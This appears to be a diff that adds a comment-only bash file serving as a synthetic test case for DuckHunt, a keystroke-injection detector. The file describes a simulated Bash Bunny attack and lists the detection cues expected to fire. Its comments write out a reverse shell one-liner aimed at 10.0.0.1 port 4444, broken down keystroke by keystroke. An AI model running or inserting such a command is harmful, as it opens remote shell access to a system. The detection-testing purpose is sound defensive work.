@@ -1,0 +1,30 @@
+#!/bin/bash
+# DuckHunt Test Payload: Bash Bunny Linux Attack
+# This is a SYNTHETIC test payload for DuckHunt detection validation
+# Simulates a Bash Bunny attack on Linux system
+
+# Test 3: Linux reverse shell establishment
+# Attack vector: Opens terminal and establishes reverse shell
+
+# Simulated keystroke sequence (timing in ms):
+# CTRL+ALT+T (open terminal) - 0ms
+# DELAY 200ms
+# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 - typed at 15ms intervals
+# ENTER
+
+# Expected Detection:
+# - Speed anomaly (15ms intervals vs ~145ms human average)
+# - Pattern match: "bash -i", "/dev/tcp", suspicious IP address pattern
+# - Terminal context with suspicious command
+# - Zero error rate
+# - Consistent mechanical timing (no human variation)
+
+# Detection Confidence: Expected >0.90
+
+# Keystroke sequence breakdown:
+# b (15ms) a (15ms) s (15ms) h (15ms) SPACE (15ms) - (15ms) i (15ms) SPACE (15ms)
+# > (15ms) & (15ms) SPACE (15ms) / (15ms) d (15ms) e (15ms) v (15ms) / (15ms)
+# t (15ms) c (15ms) p (15ms) / (15ms) 1 (15ms) 0 (15ms) . (15ms) 0 (15ms) . (15ms)
+# 0 (15ms) . (15ms) 1 (15ms) / (15ms) 4 (15ms) 4 (15ms) 4 (15ms) 4 (15ms)
+# SPACE (15ms) 0 (15ms) > (15ms) & (15ms) 1 (15ms)
+# ENTER
